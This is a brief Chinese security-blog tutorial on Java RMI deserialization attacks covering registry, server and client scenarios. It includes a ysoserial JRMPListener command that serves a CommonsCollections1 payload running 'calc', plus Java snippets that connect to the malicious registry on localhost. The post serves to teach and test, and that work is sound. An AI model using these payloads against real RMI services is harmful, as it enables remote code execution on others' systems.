# java安全-02RMI

阅读量 **185967**

发布时间 : 2022-04-06 10:30:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t013b103b713fbe1cee.jpg)

## 基础知识

  * 动态代理
  * 反射

## 攻击方式

###  注册端攻击服务端

    
    
    java -cp .\ysoserial-master-8eb5cbfbf6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "calc"
    
    
    
        public static void main(String[] args) throws RemoteException, MalformedURLException, NotBoundException, RemoteException {
            //开启一个恶意的reg，然后server去过去链接注册，则会中招
            String url = "rmi://127.0.0.1:1099/setUser";
            Naming.unbind(url);
        }
    

注册端攻击客户端

    
    
        public static void main(String[] args) {
            //PS F:\tools\EXP> java -cp .\ysoserial-master-8eb5cbfbf6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "calc"
            try{
                String url = "rmi://127.0.0.1:1099/exp";
                User user = (User) Naming.lookup(url);
    
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    

###  服务端攻击注册端

注册端开启

![](https://p3.ssl.qhimg.com/t01df347980553477f3.png)

Server端利用CC1进行攻击

![](https://p0.ssl.qhimg.com/t014e41bb96bb774b24.png)

![](https://p0.ssl.qhimg.com/t0125af3575fbc3b5df.png)

###  服务端攻击客户端

服务端将恶意类注册

![](https://p1.ssl.qhimg.com/t01989d10566c4f11ad.png)

客户端加载执行

![](https://p4.ssl.qhimg.com/t01537897879c4ffab9.png)

![](https://p0.ssl.qhimg.com/t01cd549ff4af8cd6a5.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **雷石安全实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/271354](/post/id/271354)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Java](/tag/Java)

 **+1** __2赞

 __收藏

![](https://p2.ssl.qhimg.com/t01ebe472d127128939.png) 雷石安全实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

